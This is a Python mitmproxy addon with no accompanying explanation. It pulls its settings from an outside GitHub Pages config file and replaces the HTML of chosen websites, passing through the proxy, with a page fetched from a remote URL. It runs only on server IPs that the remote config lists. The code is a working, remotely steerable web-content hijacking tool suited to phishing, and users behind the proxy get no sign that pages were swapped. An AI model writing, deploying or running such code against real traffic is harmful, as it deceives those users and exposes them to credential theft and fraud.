from mitmproxy import http
import requests
import socket

CONFIG_URL = "https://adamtuwima.github.io/bandana/config.json"

def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "0.0.0.0"

local_ip = get_local_ip()

try:
    config = requests.get(CONFIG_URL, timeout=5).json()
except:
    config = {}

DOMAINS_TO_REPLACE = config.get("domains", [])
HTML_URL = config.get("html_url", "")
ENABLED = config.get("enabled", True)
ALLOWED_IPS = config.get("active_servers", [])

html_cache = None

def domain_matches(host, domains):
    if "*" in domains:
        return True
    return any(domain in host for domain in domains)

def response(flow: http.HTTPFlow):
    global html_cache
    if not ENABLED:
        return
    if local_ip not in ALLOWED_IPS and "*" not in ALLOWED_IPS:
        return

    host = flow.request.pretty_host
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" in content_type and domain_matches(host, DOMAINS_TO_REPLACE):
        if not HTML_URL:
            return
        if html_cache is None:
            try:
                html_cache = requests.get(HTML_URL, timeout=5).text
            except:
                return
        flow.response.content = html_cache.encode("utf-8")
        flow.response.headers["content-length"] = str(len(flow.response.content))
        flow.response.status_code = 200
        flow.response.reason = "OK"
